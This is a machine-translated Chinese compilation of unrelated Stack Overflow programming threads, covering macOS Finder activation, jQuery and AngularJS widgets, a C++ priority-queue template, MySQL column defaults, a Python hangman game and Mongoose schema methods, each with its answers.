我正在使用它在最前面的查找器窗口中选择一堆文件，这些文件可以正常工作：

```
[[NSWorkspace sharedWorkspace] activateFileViewerSelectingURLs:atFilesDest]; 
```

然而，取景器出现在我真正不想要的东西面前。

任何线索如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-29T05:32:15.287

我知道这是一个老问题，但为了像我这样的任何其他谷歌用户，我建议使用 AppleScript 或使用[Scripting Bridge](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ScriptingBridgeConcepts/Introduction/Introduction.html)（可能是 Scripting Bridge）。

然后，您可以在 Finder 中执行“选择”命令，而不执行“激活”命令，这样 Finder 就不会被激活。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-28T18:36:43.353

已解决：我正在使用终端解决 Xcode 错误，我的应用程序套件有时会卡在 Dock 中。（我仍在尝试解决为什么 Xcode 有这个错误。）

此解决方法导致 activateFileViewerSelectingURLs aka 'Reveal In Finder...' 停止工作：

```
sudo killall launchservicesd; sudo killall Dock; 
```

这个新的解决方法修复了“在 Finder 中显示”问题：

```
sudo killall launchservicesd; sudo killall Dock; sudo killall Finder; 
```

原始问题：

```
[[NSWorkspace sharedWorkspace] activateFileViewerSelectingURLs:urls]; 
```

Finder 不再出现在最前面，而且我的应用程序窗口通常会遮挡 Finder 窗口，因此用户不知道刚刚发生了什么。

我找不到激活 Finder 并将其置于最前面的解决方法。

我尝试了各种方法，例如 [NSApp deactivate] 和其他 NSApp api。还有其他人有这个问题吗？我注意到 El Cap 改变了聚光灯的工作方式，将“在 Finder 中显示...”隐藏在列表底部。

# javascript - TypeError 方法/函数在对象“generateGallery”中未定义，但在 console.log 中定义

> ID：13328741
> 
> 赞同：2
> 
> 时间：2012-11-11T05:05:44.380
> 
> 标签：javascript, json, undefined, jqtouch, typeerror

我正在使用 jQTouch 库和[http://samshull.com/的扩展照片库](http://samshull.com/)

```
<script type="text/javascript" src="jqtouch.js"></script>
<script text="type/javascript">
  var jQT = $.jQTouch(...);
</script>

<script type="text/javascript" src="jqt.photo.js"></script>
<script text="type/javascript">
  console.log(jQT);
  jQT.generateGallery("galleryID",[{src:"image1.jpg"},{src:"image2.jpg"}]);
</script> 
```

当我在我的 jQT 对象上执行 console.log 时，它会显示（注意 generateGallery 已定义）：

```
Object
  addAnimation: function addAnimation(animation) {
  animations: Array[12]
  generateGallery: function generateGallery(id, images, options) {
  getOrientation: function getOrientation() {
  goBack: function goBack() {
  goTo: function goTo(toPage, animation) {
  goToSlide: function (gallery, index, animation, reverse) {
  history: Array[1]
  insertPages: function insertPages(nodes, animation) {
  settings: Object
  submitForm: function submitHandler(e, callback) {
  __proto__: Object 
```

但是当我尝试调用`jQT.generateGallery`它时说它是未定义的。

`Uncaught TypeError: Object #<Object> has no method 'generateGallery'`

任何人都知道我在这里缺少什么，我的 javascript 有点生疏。

# grails - GSP 中的数组索引

> ID：13328744
> 
> 赞同：0
> 
> 时间：2012-11-11T05:06:31.080
> 
> 标签：grails, gsp

我是 grails 的新手，我试图在 GSP 中使用变量作为数组索引，但它不起作用，这在 GSP 中可行吗？

```
<g:set var="counter" value="${0}"></g:set>
<td align="center">${arr[${counter}][1]?.toDouble()}</td> 
```

我很感激帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T08:08:20.707

该`${}`表达式用于[在 GSP 中嵌入 Groovy 代码](http://grails.org/doc/latest/guide/theWebLayer.html#GSPBasics)，它不用于引用变量值：

```
<td align="center">${arr[counter][1]?.toDouble()}</td> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T07:26:26.660

确保将变量“arr”作为控制器中的映射键返回，然后 GSP 可以引用它，例如：

控制器：

```
def myAction() {
  [arr: [1,2,3,4,5]]
} 
```

# c++ - 最低优先级队列模板

> ID：13328747
> 
> 赞同：1
> 
> 时间：2012-11-11T05:07:30.007
> 
> 标签：c++, priority-queue

我正在制作一个最低优先级队列。我们提供了一个模板来使用，该模板引发了一些问题。这是两个代码。

这是头文件。

```
#ifndef _PRIORITY_QUEUE_
#define _PRIORITY_QUEUE_
template <typename _T> struct element
{
    typedef _T data_type ;
    element () {}
    element (int _k, const _T & _e) : m_key (_k), m_element (_e) {}
    int m_key ;
    data_type  m_element ;
} ;
/*
 * compare keys of _e1 and _e2 
 */
template <typename _T> bool operator < (const element<_T> & _e1, const element<_T> & _e2)
{
    return _e1.m_key < _e2.m_key ;
}

template <typename _T> std::ostream & operator << (std::ostream & os, const element<_T> & _e)
{
    std::cout<<'['<<_e.m_key<<','<<_e.m_element<<']'<<std::endl; 
    return os ;
}

/**
 * Linear data structure implementation
 * _E is the element type
 */
template <typename _E>
class linear_heap 
{
public :
    typedef _E element_type ;
    typedef typename _E::data_type data_type; 

    linear_heap (int _s = 100) 
    {
        allocate_memory(_s);
        this->m_size = 0; 
    }

    unsigned size () const {return this->m_size ; }
    element_type & get_min () throw (const char *) 
    {
        if (true == is_empty()) throw ("Empty heap");
        return m_array[0] ;
    } ;

    void insert_element (const element_type & _e) 
    { 
        // implement 
    }
    void delete_min () throw (const char * )
    {
        if (true == is_empty()) throw ("Empty heap"); 
        // implement

    }
public :

    void update_element (element_type & _e, int _k)
    {
        // implement 
    }
    void build_heap () 
    {
        // implement
    } 
    void remove_element (element_type & _e)
    {
        // implement
    }

    bool is_empty () 
    {
        return (0 == m_size ); 
    }
    void allocate_memory (unsigned _s)
    {
        this->m_capacity = _s; 
        this->m_array.resize (this->m_capacity);
    }

protected :
    unsigned m_capacity  ; // The capacity of m_array 
    unsigned m_size ; // The number of current elements

    // implement
    // choose one of the following data structure. 
    std::vector<element_type> m_array ; // Storage of elements
//  std::list<element_type> m_array ; // Storage of elements

} ;

/**
 * Binary heap implementation 
 * _E is the element type
 */
template <typename _E>
class binary_heap 
{
public :
    typedef _E element_type ;
    typedef typename _E::data_type data_type; 

    binary_heap (int _s = 100) 
    {
        allocate_memory(_s); 
        this->m_size = 0; 
    }

    unsigned size () const {return this->m_size ; }
    element_type & get_min () throw (const char *) 
    {
        if (true == is_empty()) throw ("Empty heap");
        return m_array[0] ;
    } ;

    element_type & operator [] (unsigned id)
    {
        return m_array[id] ;
    }
    void insert_element (const element_type & _e) 
    { 
        // implement 
    }
    void delete_min () throw (const char * )
    {
        if (true == is_empty()) throw ("Empty heap"); 
        // implement

    }
public :

    void update_element (element_type & _e, int _k)
    {
        // implement 
    }
    void build_heap () 
    {
        // implement
    } 
    void remove_element (element_type & _e)
    {
        // implement
    }

    bool is_empty () 
    {
        return (0 == m_size ); 
    }
    void allocate_memory (unsigned _s)
    {
        this->m_capacity = _s; 
        this->m_array.resize (this->m_size);
    }

protected :
    unsigned m_capacity  ; // The capacity of m_array 
    unsigned m_size ; // The number of current elements
    std::vector<element_type> m_array ; // Storage of elements

} ;

/**
 * _H is the heap type. Could be array, list or binary heap. 
 *
 */
template <typename _H> class priority_queue  
{
public :
    typedef typename _H::element_type element_type ; 
    typedef typename _H::data_type   data_type ; 
    typedef _H heap_type ; 

    void insert (int _key, const data_type & _value)
    {
        m_heap.insert_element (element_type (_key, _value));
    }

    element_type & min ()
    {
        return m_heap.get_min();
    }

    element_type & get_loc (unsigned id)
    {
        return m_heap[id] ;
    }

    void createPriorityQueue () 
    {
        m_heap.build_heap (); 
    }

    void decreaseKey (element_type & _e, int _k)
    {
        m_heap.update_element (_e, _k) ;
    }

    void remove (element_type & _e)
    {
        m_heap.remove_element(_e) ;
    }
    unsigned size () const 
    {
        return m_heap.size(); 
    }
    bool isEmpty() 
    {
        return m_heap.is_empty(); 
    }
protected :
    heap_type m_heap ;
} ;

template <typename _H> std::istream & operator >> (std::istream & is, priority_queue <_H> & _p)
{
    typedef typename _H::element_type element_type ; 
    typedef typename _H::data_type   data_type ; 

    int key ;
    data_type value ;
    while (std::cin>>key>>value) 
    {
        _p.insert (key, value) ; 
    }
    return is ;
}

#endif 
```

这是主文件。

```
#include <vector> 
#include <list>
#include <string>
#include <iostream>

#include "priority_queue.h"

int main()
{

    try
    {
        priority_queue<linear_heap<element<std::string> > > string_linear_heap ; 

        // create the binary heap . 
        priority_queue<binary_heap<element<std::string> > > string_binary_heap ; 
        std::cin>>string_binary_heap ;
        string_binary_heap.createPriorityQueue() ;

        // Decrease the key of the first element by 2\. 
        // You may output the cost of decreaseKey here. 
        string_binary_heap.decreaseKey (string_binary_heap.get_loc(0), string_binary_heap.get_loc(0).m_key - 2);

        // Try to pop up elements in order w.r.t. their keys. 
        while (!string_binary_heap.isEmpty())
        {
            element <std::string> & loc = string_binary_heap.min() ;
            std::cout<<loc<<std::endl;
            // You may output the cost of remove here. 
            string_binary_heap.remove(loc); 
        }
    }

    catch (const char * msg)
    {
        std::cerr<<"  [EXCEPTION] "<<msg<<std::endl;
    }
    return 0;
} 
```

当他们将它放入线性堆时，这是否意味着向量以正常格式存储？正常情况下，我的意思是把它想象成一排分配了数据的正方形。另外，每当它说二叉堆时，将其存储为二叉树？

在实现这些功能时，您是否使用法线向量运算符（推回、擦除等）？再一次，这是家庭作业。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T09:37:06.490

`vector` implementation is independent of its usage. Your `linear_heap` and `binary_heap` are the same as far as storage in vector goes. What is different is the algorithms of insertion/deletion etc. for linear and binary heap. You need to use the vector container in a way it fits these algorithms (and yes, you use the normal vector interface). For a binary heap, for example, you can look here: [Efficient Array Storage for Binary Tree](https://stackoverflow.com/questions/2675756/efficient-array-storage-for-binary-tree)

# java - 如何将 ListView 保持在调用 notifydatasetchanged 之前的最后一个位置

> ID：13328748
> 
> 赞同：0
> 
> 时间：2012-11-11T05:07:34.467
> 
> 标签：java, android-listview

这个问题已在 2011 年提出，但我找不到答案，所以我得到了这个问题并重新发布。

> 我扩展了列表视图，30 个项目，当我到达底部时，我又加载了 30 个。然后我打电话给 notifyDataSetChanged ，问题是列表移动到顶部，所以失去了我当前的选择。我想要，列表应该添加更多，但它应该放在底部，我的选择统计不应该改变，就像其他应用程序一样。他们默默地在底部添加了新项目。如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:31:31.030

好的，所以我做了更多的挖掘。我是对的，老实说，它不应该再次在顶部令人耳目一新。回答了完全相同的问题，并且似乎有效：

[ListView 刷新将其置于列表顶部](https://stackoverflow.com/questions/8563099/listview-refresh-taking-it-to-the-top-of-the-list)

它也非常适合我。但是同样，如果它不起作用，那么您的另一个选择是使用 CursorLoader （我的情况），但我认为我们看不到的底层代码也称为`notifyDataSetChanged`，所以我不确定还能做什么。但是查看实际代码会很有帮助，因为您没有发布任何代码，这意味着您可能做错了什么。

# php - 将列添加到表并将该列的所有行的值设置为指定值

> ID：13328750
> 
> 赞同：1
> 
> 时间：2012-11-11T05:08:12.547
> 
> 标签：php, mysql, alter

我有一个需要添加一列的 SQL 数据库表。添加该列后，我需要为添加的列一次性指定所有行的值；我知道要添加我可以使用以下内容的列：

```
// Adds a column to the table
"ALTER TABLE myTable ADD lastCheck INT;" 
```

从这里我只剩下使用 php 循环遍历 15+k 行表了。有没有更好/更快的方法来做到这一点而不必依赖 PHP 作为工作马？

几点注意事项：
1：初始设置列行的值后，值可以为空，因此指定默认值是不可能的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-11T05:10:15.807

试试这个

```
ALTER TABLE myTable ADD lastCheck INT DEFAULT 10 
```

或者您可以在之后运行更新

```
UPDATE MyTable SET lastCheck = 10 
```

## [SQL小提琴](http://sqlfiddle.com/#!2/6df6e/1)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T05:12:10.187

您可以使用：

```
$query="Update Tablename set Columnname='value'"; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T05:15:28.557

这应该适合你：

```
ALTER TABLE myTable ADD COLUMN lastCheck INT DEFAULT 123 
```

这将添加新列并将所有记录的列值一次设置为 123。这不会禁止该列具有 NULL 值。实际上，您甚至可以在执行此操作后将默认设置为 NULL：

```
ALTER TABLE myTable ALTER COLUMN lastCheck DROP DEFAULT 
```

# javascript - AngularJS ui-date 格式

> ID：13328756
> 
> 赞同：5
> 
> 时间：2012-11-11T05:09:11.770
> 
> 标签：javascript, angularjs, angular-ui

所以我有 ：

```
<input ng-model="date1" ui-date>
<div ng-model="date2" ui-date></div> 
```

它工作得很好。div 日历 'date2' 将跟随其之前的 ui-date 输入的变化，即 'date1' 输入框。

AngularUI 做得很好，当您在一个页面中存在多个 input+div 日历时，想象一个旅行社预订页面，“date4”将自动与“date3”分组，“date6”将自动与“date5”分组......等等 做得好。

但是，在我的示例代码中，`<input ng-model="date1" ui-date>`仅适用于带有反斜杠分隔符“MM/dd/yyyy”的美国格式。

我的问题是，如何更改默认输入日期格式？如果我想将 iso-8601 'yyyy-MM-dd' 作为输入，ui-date 似乎不会将其识别为有效输入。

我试过`ui-date="yyyy-MM-dd"`了，好像没什么效果。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-11T07:12:07.993

由于这是 jQueryUI 中日期选择器的包装器，因此您应该在[此处查看文档](http://jqueryui.com/datepicker/#date-formats)

你可以这样设置

```
ui-date="{ dateFormat: 'yy-mm-dd' }" 
```

这是[plunker](http://plnkr.co/edit/jvbH9Q?p=preview)

# python - 不应该更改字符串并运行问题

> ID：13328763
> 
> 赞同：1
> 
> 时间：2012-11-11T05:10:53.200
> 
> 标签：python, python-2.7

只是快速了解一下它的作用。生成一个由数字和 2 个符号（+ 和 *）组成的秘密字符串，供用户猜测。我猜是刽子手。我已经解决了我遇到的所有其他问题，而且我只剩下一个半了。我是新手。

**首先，**一个问题是有时运行它（在 IDLE 中使用 F5）不会显示任何内容。只需“>>”，我必须关闭外壳并重新运行它。

**其次**，在赢得并拒绝再次比赛的提议后，它仍然要求输入猜测。我想while循环仍然在运行，那么我怎么能停止它呢？

可能还有其他问题我忽略了，但我已经经历了一点，一切似乎都正常。如果有任何建议可以让它变得更好（但没什么太高级的），请随时指出！

所以这就是我所拥有的：

```
from random import randint, choice
maxguesses = 11                                     
wins = 0                                            
losses = 0                                          
points = 0                                          
games = 0                                           
numguesses = 0                                      
allowed = ('0','1','2','3','4','5','6','7','8','9','0','+','*')

guesses = ''                                        
def genform():                                      
    global secret                                   
    global guesses
    global maxguesses
    sym = choice(['++','**','+*','*+'])             
    num = ''                                        
    max = randint(3,9)                             
    for i in range(max):                           
        num = num + str(randint(0,9))               
    secret = sym + num                              
    guesses = ''
    maxguesses = len(secret)+2                      
    return secret                                   

def evaluate(b):
    global evaluated
    evaluated = ''
    s1 = secret[0]
    s2 = secret[1]
    for i in range(2,len(secret)-1):
        evaluated = evaluated + secret[i]
        if (i%2 == 0):
            evaluated = evaluated + s1
        else:
            evaluated = evaluated + s2
    evaluated = evaluated + secret[-1]
    return evaluated

letters = set()
partial = ''
def takeguess(ch):
global numguesses, points, games, wins, partial, guesses
numguesses = numguesses + 1                              
print 'Remaining Guesses: ' + str(maxguesses-numguesses)
if (ch in partial) or (ch in guesses):                      
    print "\nYou've already guessed '%s'. Try again: " % ch
elif ch not in secret:
    guesses = guesses + ch
    print 'Wrong, guess again.'
elif ch in secret:                                         
    letters.add(ch)                                        
    print "\nGood guess, it's in the secret formula!"
    partial = ''.join([l if l in letters else '-' for l in secret])
    print 'Formula so far: ' + partial
    if partial == secret:                                   
        print 'You win!'
        wins = wins + 1
        points = points + 2
        games = games + 1
        bonus = raw_input("Evaluate the formula for 10 bonus points: ") 
        if bonus == str(eval(evaluate(secret))):                        
            points = points + 10
            print "That's correct! +10 points."
            print eval(evaluate(secret)) #REMOVE AFTER
            play_again()
        else:                                              
            print "That's incorrect. The right answer is", eval(evaluate(secret))
            play_again()

def play_again():
global numguesses, guesses, partial, letters
letters = set()
    if points < 2:
        print "\nYou don't have enough points to play again.\nGames Played: " + str(games) + '\nPoints: ' + str(points)
    else:        
        ans = raw_input('Would you like to play again? [y/n] ')
        if ans in ('yY'):
            numguesses = 0
            guesses = ''
            partial = ''
            play()
        elif ans in ('nN'):
            print '\nOkay, goodbye.\nWins: ' + str(wins) + '\nLosses: ' + str(losses) + '\nPoints: ' + str(points)
        else:
            print 'Invalid input.'
            play_again()

def play():
    global numguesses, guesses, partial, points, games, losses
    genform()
    print 'Unsolved formula: ' + ('-'*len(secret))
    print 'You have ' + str(maxguesses) + ' guesses.'
    print secret #REMOVE AFTER
    while (numguesses < maxguesses):
        guess = raw_input('\nEnter a guess: ')    # Receive guess
        if guess not in allowed:                # Check if valid
            print '\nInvalid guess, please enter a single digit, *, or +. Try again: '  
        elif partial != secret:
            takeguess(guess)
            print guesses # REMOVE AFTER
        if numguesses == maxguesses:
            points = points - 2
            games = games + 1
            losses = losses + 1
            print 'Sorry, you lose. The answer is: ' + secret
            play_again()
            return

print 'Welcome to hangman!\n'
play() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:33:52.683

这段代码的最大问题是你到处都在使用全局变量。如果您将值存储在 python 对象中并在每次开始新游戏时初始化您的对象，这会好得多。

要修复您现在使用的内容，您需要`letters`在`play_again()`函数中初始化...

```
def play_again():
    global numguesses, guesses, partial
    global letters
    letters=set()   # Reset letters to be empty
    if points < 2:
        print "\nYou don't have enough points to play again.\nGames Played: " + str(games) + '\nPoints: ' + str(points)
    else:
        ans = raw_input('Would you like to play again? [y/n] ')
        if ans in ('yY'):
            numguesses = 0
            guesses = ''
            partial = ''
            play()
        elif ans in ('nN'):
            print '\nOkay, goodbye.\nWins: ' + str(wins) + '\nLosses: ' + str(losses) + '\nPoints: ' + str(points)
        else:
            print 'Invalid input.'
            play_again() 
```

# inheritance - 为什么我的嵌套 Div 不继承父高度？

> ID：13328764
> 
> 赞同：4
> 
> 时间：2012-11-11T05:11:39.877
> 
> 标签：inheritance, html, height, nested

我有一个关于嵌套 div 和高度继承的非常基本的问题。假设我有以下 html 代码段：

```
...
<div style="height: 50px;">
    <div style="height: inherit;">
    </div>
</div>
... 
```

我会认为只是通过检查内部 div 与外部 div 具有相同的高度（50px），但是当我测试它时，高度没有被继承。

首先，div 之间的父/子关系是通过嵌套一个嵌套来定义的吗？接下来，我需要做什么才能使内部div继承外部div？

抱歉，伙计们问了这么一个基本问题。我在这里一直在工作（在其他东西上工作了几个小时，我不得不换档）。请不要因为我问了这么愚蠢的问题而责备我。:)

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-11T05:14:03.103

如果您无法达到父级的`inherit`高度，请`div`使用div`height: 100%;``inner`

[**演示**](http://jsfiddle.net/J6e8A/)

顺便说一句，你的 div 确实继承了高度，只是如果你想看到给它 a`background-color`或 a `border`，你会看到内部 div 继承了它的父 div 的高度

[**演示 2**](http://jsfiddle.net/J6e8A/2/)

# file - 在 rcp 应用程序中获取 .xslt 文件的路径

> ID：13328765
> 
> 赞同：0
> 
> 时间：2012-11-11T05:11:43.307
> 
> 标签：file, eclipse-plugin, path

在 RCP 应用程序中，我们将 .xslt 文件保存在资源文件夹下。但是 .xslt 文件的路径没有进入 rcp 应用程序

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T05:28:31.693

确保在 build.properties 中包含资源文件夹，并且可以使用 URI 访问该文件 `platform:/plugin/<plugin-name>/<folder-name>/test.xslt`

# c# - 使用 csc 编译 c# 代码

> ID：13328767
> 
> 赞同：0
> 
> 时间：2012-11-11T05:12:02.443
> 
> 标签：c#, csc

我已经用 VS2010 用 C# 开发了一些代码，现在我想编译它，但不幸的是我不能在 Windows 7 中这样做，我必须在 Windows Server 2008 中这样做，因为代码正在访问 Windows 7 中不存在的库。

无论如何，我使用 CSC 尝试了所有可能的参数，但似乎我无法使用 CSC 在 Windows Server 2008 中编译我的代码。我真的不确定我正在使用的命令：

```
CSC /out:myfile.exe c:\myCode\*.cs 
```

“c:\myCode”实际上是我所有的 cs 文件所在的位置。我在我的 Windows Server 2008 机器上安装了最新版本的 .Net 框架。所以我认为这没有任何问题。

请帮助。谢谢

# javascript - jQuery表单验证不验证

> ID：13328772
> 
> 赞同：1
> 
> 时间：2012-11-11T05:13:05.557
> 
> 标签：javascript, jquery, html, forms

我只是在这里让自己发疯。我不知道为什么我的 jQuery 验证不起作用。在dreamweaver中甚至没有弹出该功能，就好像找不到它一样。我把这段代码从 jQuery 网站上拿了下来。有人请帮忙！

这是我的 HTML 代码：

```
<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Logic & Design: Home</title>
        <link rel="stylesheet" type="text/css" href="styles/divs.css" />
        <link rel="stylesheet" type="text/css" href="styles/fonts.css" />
        <link rel="stylesheet" type="text/css" href="styles/forms.css" />
        <link rel="stylesheet" type="text/css" href="styles/tags.css" />
        <link rel="stylesheet" type="text/css" href="styles/images.css" />
        <script src="http://code.jquery.com/jquery-latest.js"></script>
        <script type="text/javascript" src="http://jzaefferer.github.com/jquery-validation/jquery.validate.js"></script>
        <script src="scripts/animations.js"></script>
        <script src="scripts/socialMediaPlugins.js"></script>        
        <script src="scripts/formValidate.js"></script>
    </head>
    <body>
        <div id="wrapper">
            <header>
                <img id="logo" alt="logo" src="images/Logo.png" />
            </header>
            <div id="divider">
                <img id="headerDivider" alt="Line" src="images/Line.jpg" />
            </div>
            <nav>
                <div class="Button" id="selectedButton">
                    <img id="arrowOverlay" alt="Overlay" src="images/Arrows/FadeArrow.png" />
                    <img id="extender" alt="Home" src="Images/Arrows/Arrow%20Body.png" />
                    <img id="selectedArrow" alt="Contact Me" src="Images/Arrows/Contact/Contact.png"/>
                </div>
                <div class="Button" id="homeButton">
                    <img alt="Home" src="Images/Arrows/Home/Home.png" />
                </div>
                <div class="Button" id="aboutButton">
                    <img alt="About Me" src="Images/Arrows/About/About.png"/>
                </div>
                <div class="Button" id="abilitiesButton">
                    <img alt="My Abilities" src="Images/Arrows/Abilities/Abilities.png"/>
                </div>
                <div class="Button" id="portfolioButton">
                    <img alt="My Portfolio" src="Images/Arrows/Portfolio/Portfolio.png"/>
                </div>
            </nav>
            <div id="mainContent">
                <div id="innerContent">
                    <form id="emailForm" name="Email" method="post" action="">
                        <div class="FormRow"><label for="Name">Name</label><input name="Name" type="text" /></div>
                        <div class="FormRow"><label for="Email">Email Address</label><input name="Email" type="text" /></div>
                        <div class="FormRow"><textarea name="Message"></textarea></div>
                        <div class="FormRow"><input type="submit" name="Submit" value="Message Me!" /></div>
                    </form>
                    <div id="results"></div>
                </div>
            </div>
            <div id="imageBar">
                <div id="networkingIcons">
                    <div id="fb" class="fb-like-box" data-href="http://www.facebook.com/logicanddesign" data-width="200" data-height="75" data-colorscheme="dark" data-show-faces="false" data-stream="false" data-header="false"></div>
                    <a class="twitter-timeline" href="https://twitter.com/JackSchaible" data-widget-id="266804071627898880">Tweets by @JackSchaible</a>
                    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
                    <div class="g-plus" data-width="199" data-height="69" data-href="https://plus.google.com/105579960548041650339" data-rel="author" data-theme="dark"></div>
                    <script type="text/javascript">
                      (function() {
                        var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
                        po.src = 'https://apis.google.com/js/plusone.js';
                        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
                      })();
                    </script>
                    <script src="//platform.linkedin.com/in.js" type="text/javascript"></script>
<script type="IN/Share" data-counter="right"></script>
                </div>
            </div>
            <footer>
                <p>&copy; <script type="text/javascript">document.write((new Date).getFullYear());</script> Jack Schaible</p>
            </footer>
        </div>
        <?php
            /*if ($errors != '') {
                echo '<script type="text/javascript">';
                    echo 'alert($errors);';
                echo '</script>';
            }*/
        ?>
    </body>
</html> 
```

这是我的`formValidate.js`：

```
// JavaScript Document
$(document).ready(function(){
    $("#emailForm").validate();
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:20:27.173

我认为您缺少验证规则。

```
 <form id="emailForm" name="Email" method="post" action="">
                <div class="FormRow"><label for="Name">Name</label><input name="Name" type="text" class="required" /></div>
                <div class="FormRow"><label for="Email">Email Address</label><input name="Email" type="text" class="required email" /></div>
                <div class="FormRow"><textarea name="Message"></textarea></div>
                <div class="FormRow"><input type="submit" name="Submit" value="Message Me!" /></div>
            </form> 
```

应该像上面那样。在表单元素的类属性中添加您的验证规则。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T05:16:45.070

您是否正在检查表格是否有效？像这样的东西？

`if ($("emailForm").valid() === true) { ... } else { return; }`

# php - Kohana“调用未定义的方法 Form::upload()”

> ID：13328774
> 
> 赞同：0
> 
> 时间：2012-11-11T05:13:15.263
> 
> 标签：php, forms, kohana

我不知道为什么会发生这种情况。所有文档都说该方法存在。我很确定我使用的是 Kohana 2.3，我大约 4 个月前才开始使用它。

这是问题所在的代码块：

```
 3 <?=Form::open("admin/project/post/".$project->id)?>
 4  <?=Form::label("git_project_name", "Git Project Name")?>
 5  <?=Form::input("git_project_name", $project->git_project_name)?>
 6  <br />
 7  <?=Form::label("icon_path", "Icon Path")?>
 8  <?=form::upload("icon_local_path", "")?>   //EXCEPTION HERE
 9  <?=Form::input("icon_path", $project->icon_path, " readonly")?>
10  <br />
11  <?=Form::label("product_url", "Product URL")?>
12  <?=Form::input("product_url", $project->product_url)?>
13  <br /> 
```

如果我删除提到的行，一切正常。如果上传不存在，我应该使用什么来上传文件？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:27:37.807

显然我使用的是版本 3，版本 3 使用术语“文件”而不是“上传”。愚蠢的错误。

所以将“Form::upload”更改为“Form::file”解决了我的问题:)

# node.js - 小猫不会说话

> ID：13328777
> 
> 赞同：11
> 
> 时间：2012-11-11T05:14:05.907
> 
> 标签：node.js, mongodb, mongoose

我正在运行[猫鼬快速入门](http://mongoosejs.com/docs/index.html)`fluffy.speak()`，我的应用程序一直因错误而死`TypeError: Object { name: 'fluffy', _id: 509f3377cff8cf6027000002 } has no method 'speak'`

本教程中我的（稍作修改）代码：

```
"use strict";

var mongoose = require('mongoose')
  , db = mongoose.createConnection('localhost', 'test');

db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', function () {
    var kittySchema = new mongoose.Schema({
        name: String
    });
    var Kitten = db.model('Kitten', kittySchema);
    var silence = new Kitten({name: 'Silence'});
    console.log(silence.name);
    kittySchema.methods.speak = function() {
        var greeting = this.name ? "Meow name is" + this.name : "I don't have a name";
        console.log(greeting);
    };

    var fluffy = new Kitten({name: 'fluffy'});

    fluffy.speak();

    fluffy.save(function(err) {
        console.log('meow');
    });

    function logResult(err, result) {
        console.log(result);
    }

    Kitten.find(logResult);
    Kitten.find({name: /fluff/i }, logResult);
}); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-11T05:22:38.497

当您调用`db.model`时，模型是从您的模式编译的。那时，它`schema.methods`被添加到模型的原型中。因此，您需要先在模式上定义任何方法，然后再用*它*制作模型。

```
// ensure this method is defined before...
kittySchema.methods.speak = function() {
    var greeting = this.name ? "Meow name is" + this.name : "I don't have a name";
    console.log(greeting);
}

// ... this line.
var Kitten = db.model('Kitten', kittySchema);

// methods added to the schema *afterwards* will not be added to the model's prototype
kittySchema.methods.bark = function() {
    console.log("Woof Woof");
};

(new Kitten()).bark(); // Error!  Kittens don't bark. 
```

# javascript - 扩展 jQuery 插件/小部件对象以添加方法

> ID：13328778
> 
> 赞同：3
> 
> 时间：2012-11-11T05:14:28.870
> 
> 标签：javascript, jquery

我经常看到开发者通过扩展widget对象来给自己的jquery Widget添加方法。我不确定我真的明白为什么，如果有人能解释一下，我会很感激。

例如，[jQuery UI Autocomplete Widget](https://github.com/jquery/jquery-ui/blob/master/ui/jquery.ui.autocomplete.js#L551)的作者向他们的小部件添加了 2 个方法，为什么他们没有在原始小部件对象中使用它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:33:22.867

这些实用程序函数不访问任何小部件的内部数据，因此它们不需要在小部件函数中。这些名称被放入小部件的命名空间中，以防止污染全局命名空间。

# javascript - 如何在外部单击时关闭 jquery-ui 对话框？

> ID：13328779
> 
> 赞同：0
> 
> 时间：2012-11-11T05:14:35.797
> 
> 标签：javascript, jquery, jquery-ui

我正在使用 jquery-ui 对话框（非模态对话框）。如果用户在对话框外单击，我想关闭对话框。出于这个原因，我使用了[Jquery 外部事件插件](http://benalman.com/projects/jquery-outside-events-plugin/)。我还创建了一个小提琴：

[http://jsbin.com/apezok/3/edit](http://jsbin.com/apezok/3/edit)

在这个小提琴中，我创建了一个按钮，我们可以通过它打开一个对话框。我`clickoutside`也将事件与对话框绑定。现在我的问题是当我单击按钮打开对话框时，单击外部事件执行并关闭对话框。如何在打开对话框时停止执行此事件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T05:17:11.020

单击按钮元素首先会触发该元素的单击事件，然后单击事件会向上传播到 DOM 中的更高级别。`event.stopPropagation()`防止事件传播到更高级别：

```
$("#opendialog").click(function(event){
  event.stopPropagation();
  $(".dialog").dialog("open");
}); 
```

如果用户在对话框已经打开时单击打开按钮怎么办？这仍然应该算作在对话框外单击并关闭它吗？如果这是所需的行为，则以下工作：

```
$("#opendialog").click(function(event){
  if (!$(".dialog").dialog("isOpen")) {
    event.stopPropagation();
    $(".dialog").dialog("open");
  }
}); 
```

# ruby-on-rails - 在 Heroku 中配置环境路径

> ID：13328785
> 
> 赞同：0
> 
> 时间：2012-11-11T05:15:50.770
> 
> 标签：ruby-on-rails, heroku, tesseract

